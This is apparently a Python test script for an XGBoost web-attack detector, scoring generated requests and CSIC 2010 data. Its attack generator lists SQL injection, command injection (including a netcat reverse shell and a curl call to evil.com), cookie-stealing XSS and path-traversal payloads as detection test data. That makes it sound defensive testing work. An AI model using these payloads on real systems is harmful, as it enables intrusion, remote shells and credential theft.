from __future__ import annotations

import argparse
import csv
import logging
import time
from collections import defaultdict
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, quote

import numpy as np

logging.basicConfig(level=logging.WARNING, format="%(levelname)s %(message)s")
log = logging.getLogger("test_tier1")

ROOT = Path(__file__).resolve().parent.parent
CSV_PATH = ROOT / "data" / "output_http_csic_2010_weka_with_duplications_RAW-RFC2616_escd_v02_full.csv"
XGB_MODEL = ROOT / "models/tier1/xgboost_model.json"


def _feature_for(method: str, path: str, body: str, query: str, source_ip: str) -> np.ndarray:
    import sys
    sys.path.insert(0, str(ROOT))
    from test.feature_extractor import extract_features
    req_line = f"{method} {path}"
    if query:
        req_line += f"?{query}"
    req_line += " HTTP/1.1"
    req = {
        "raw": f"{req_line}\r\nHost: localhost\r\n\r\n{body}",
        "path": path,
        "query": query,
        "body": body,
        "method": method,
        "headers": {},
        "source_ip": source_ip,
    }
    return extract_features(req)


def _generate_more_attacks() -> list[dict]:
    more = []
    # SQLi variants
    sqli_variants = [
        "' OR '1'='1",
        "admin' --",
        "'; DROP TABLE users; --",
        "admin\" OR \"1\"=\"1",
        "' UNION SELECT null,null--",
        "1; SELECT sleep(5)",
        "' OR 1=1 #",
        "' OR 'x'='x",
        "1' ORDER BY 1--",
        "') OR ('1'='1",
    ]
    for p in sqli_variants:
        more.append({"type": "sql_injection", "method": "POST", "path": "/login", "body": '{"user":"%s","pass":"x"}' % p})

    # RCE variants
    rce_variants = [
        "127.0.0.1; whoami",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | id",
        "$(whoami)",
        "`uname -a`",
        "127.0.0.1 & ping -c 1 127.0.0.1 &",
        "; nc -e /bin/sh 10.0.0.1 4444",
        "| curl http://evil.com/$(whoami)",
    ]
    for p in rce_variants:
        more.append({"type": "rce", "method": "GET", "path": "/ping", "query": f"host={p}"})

    # XSS variants
    xss_variants = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>fetch('/steal?c='+document.cookie)</script>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ]
    for p in xss_variants:
        more.append({"type": "xss", "method": "GET", "path": "/search", "query": f"q={p}"})

    # Path traversal variants
    pt_variants = [
        "../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "../../../../../../etc/passwd",
    ]
    for p in pt_variants:
        more.append({"type": "path_traversal", "method": "GET", "path": "/file", "query": f"name={p}"})

    return more


def _generate_more_benign() -> list[dict]:
    more = []
    benign_searches = [
        "python tutorial",
        "how to code in java",
        "weather today",
        "latest news",
        "restaurant near me",
        "openai llm",
        "github actions ci cd",
        "docker compose tutorial",
        "linux command cheatsheet",
        "best IDE for python",
        "machine learning course",
        "react js getting started",
        "postgresql vs mysql",
        "kubernetes deployment guide",
        "typescript handbook",
        "css grid layout",
        "api design best practices",
        "oauth2 authentication flow",
        "unit testing python",
        "system design interview prep",
        "async await javascript",
        "data structures algorithms",
        "git branching strategy",
        "microservices architecture patterns",
        "sql join types explained",
    ]
    for q in benign_searches:
        more.append({"type": "benign_search", "method": "GET", "path": "/search", "query": f"q={q}"})

    return more


def smoke_test(detector) -> None:
    import sys
    sys.path.insert(0, str(ROOT))
    from test.attack import all_attacks, all_benign
    from test.feature_extractor import reset_rate_tracker

    reset_rate_tracker()

    orig_attacks = all_attacks()
    more_attacks = _generate_more_attacks()
    attacks_list = orig_attacks + more_attacks

    orig_benign = all_benign()
    more_benign = _generate_more_benign()
    benign_list = orig_benign + more_benign

    # Label each request individually
    all_items: list[tuple[dict, int, str]] = []
    for a in attacks_list:
        label = a.get("type", "attack")
        all_items.append((a, 1, f"attack/{label}"))
    for b in benign_list:
        label = b.get("type", "benign")
        all_items.append((b, 0, label))

    import random
    random.shuffle(all_items)

    features, labels, names = [], [], []
    for item, label, name in all_items:
        path = item["path"]
        q = item.get("query", "")
        body = item.get("body", "")
        features.append(_feature_for(item["method"], path, body, q, "10.0.0.1"))
        labels.append(label)
        names.append(name)

    features = np.array(features, dtype=np.float32)
    labels = np.array(labels)
    scores = detector.predict(features)

    print("\n  ── Smoke test ──")
    max_n = max(len(n) for n in names)
    n_ok = 0
    for i, name in enumerate(names):
        cls = "ANOM" if scores[i] >= 0.70 else "BENIGN"
        truth = "ANOM" if labels[i] == 1 else "BENIGN"
        ok = "✓" if cls == truth else "✗"
        if cls == truth:
            n_ok += 1
        print(f"    {i+1:2d}.  {name:{max_n+1}s}  score={scores[i]:.4f}  → {cls:6s}  (truth={truth:6s})  {ok}")

    print(f"\n    Accuracy: {n_ok}/{len(scores)} ({100*n_ok/len(scores):.1f}%)")
    for thresh, name in [(0.92, "instant_drop"), (0.70, "warning")]:
        pred = (scores >= thresh).astype(int)
        tp = int(np.sum((pred == 1) & (labels == 1)))
        fp = int(np.sum((pred == 1) & (labels == 0)))
        fn = int(np.sum((pred == 0) & (labels == 1)))
        tn = int(np.sum((pred == 0) & (labels == 0)))
        prec = tp / (tp + fp) if (tp + fp) else 0.0
        rec = tp / (tp + fn) if (tp + fn) else 0.0
        f1 = 2 * prec * rec / (prec + rec) if (prec + rec) else 0.0
        print(f"    @ {name} (≥{thresh}):  TP={tp:2d}  FP={fp:2d}  FN={fn:2d}  TN={tn:2d}  "
              f"prec={prec:.3f}  rec={rec:.3f}  F1={f1:.3f}")

    atk_scores = scores[labels == 1]
    ben_scores = scores[labels == 0]
    print(f"    Attack scores:  min={atk_scores.min():.4f}  mean={atk_scores.mean():.4f}  max={atk_scores.max():.4f}")
    print(f"    Benign scores:  min={ben_scores.min():.4f}  mean={ben_scores.mean():.4f}  max={ben_scores.max():.4f}")


def load_csic(limit: Optional[int] = None) -> list[tuple[dict, int]]:
    import sys
    sys.path.insert(0, str(ROOT))
    from test.feature_extractor import reset_rate_tracker

    grouped: dict[str, list[dict]] = defaultdict(list)
    with open(CSV_PATH, newline="", encoding="utf-8") as f:
        for row in csv.DictReader(f):
            grouped[row["index"]].append(row)

    pairs: list[tuple[dict, int]] = []
    for rows in grouped.values():
        norm_row = None
        anom_row = None
        for r in rows:
            if r["label"].strip() == "norm":
                norm_row = r
            else:
                anom_row = r
        if norm_row and anom_row:
            pairs.append((norm_row, 0))
            pairs.append((anom_row, 1))
        elif norm_row:
            pairs.append((norm_row, 0))
        if limit and len(pairs) >= limit:
            break

    reset_rate_tracker()
    return pairs[:limit]


def csic_benchmark(detector, limit: int) -> None:
    print(f"\n  ── CSIC 2010 benchmark ({limit} samples) ──")
    pairs = load_csic(limit)
    labels = np.array([l for _, l in pairs])
    n_atk = int(labels.sum())
    print(f"    attacks={n_atk}  benign={len(labels) - n_atk}")

    features = []
    for i, (row, _) in enumerate(pairs):
        url = row.get("url", "/")
        parsed = urlparse(url)
        body = row.get("payload", "")
        if body == "null":
            body = ""
        method = row.get("method", "GET")
        raw = f"{method} {url} HTTP/1.1\r\nHost: {row.get('host', 'localhost')}\r\n\r\n{body}"
        req = {
            "raw": raw,
            "path": parsed.path or "/",
            "query": parsed.query or "",
            "body": body,
            "method": method,
            "headers": {"host": row.get("host", "")},
            "source_ip": f"10.0.0.{i % 255}",
        }
        import sys
        sys.path.insert(0, str(ROOT))
        from test.feature_extractor import extract_features
        features.append(extract_features(req))
        if (i + 1) % 500 == 0:
            print(f"    features: {i+1}/{len(pairs)}")

    features = np.array(features, dtype=np.float32)
    t0 = time.time()
    scores = detector.predict(features)
    elapsed = time.time() - t0
    print(f"    inference: {len(features)} in {elapsed:.2f}s  ({len(features)/elapsed:.0f} req/s)")

    for thresh, name in [(0.92, "instant_drop"), (0.70, "warning")]:
        pred = (scores >= thresh).astype(int)
        tp = int(np.sum((pred == 1) & (labels == 1)))
        fp = int(np.sum((pred == 1) & (labels == 0)))
        fn = int(np.sum((pred == 0) & (labels == 1)))
        tn = int(np.sum((pred == 0) & (labels == 0)))
        prec = tp / (tp + fp) if (tp + fp) else 0.0
        rec = tp / (tp + fn) if (tp + fn) else 0.0
        f1 = 2 * prec * rec / (prec + rec) if (prec + rec) else 0.0
        print(f"    @ {name:12s}  TP={tp:4d}  FP={fp:4d}  FN={fn:4d}  TN={tn:4d}  "
              f"prec={prec:.3f}  rec={rec:.3f}  F1={f1:.3f}")

    atk_scores = scores[labels == 1]
    ben_scores = scores[labels == 0]
    print(f"    Attack scores:  mean={atk_scores.mean():.4f}  median={np.median(atk_scores):.4f}")
    print(f"    Benign scores:  mean={ben_scores.mean():.4f}  median={np.median(ben_scores):.4f}")
    print(f"    (Model trained on CSIC 2010 — 64% recall @ instant_drop, 65% @ warning)")


async def main(limit: int, skip_smoke: bool) -> None:
    import sys
    sys.path.insert(0, str(ROOT))
    from lympa.tier1.xgboost_model import XGBoostAnomalyDetector

    print("Loading XGBoost model...")
    detector = XGBoostAnomalyDetector(model_path=XGB_MODEL, feature_dim=48)
    await detector.load()

    if not skip_smoke:
        smoke_test(detector)

    csic_benchmark(detector, limit)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test Tier 1 (XGBoost)")
    parser.add_argument("--limit", "-n", type=int, default=10000, help="CSIC 2010 sample count")
    parser.add_argument("--no-smoke", action="store_true", help="Skip quick smoke test")
    args = parser.parse_args()
    import asyncio
    asyncio.run(main(limit=args.limit, skip_smoke=args.no_smoke))
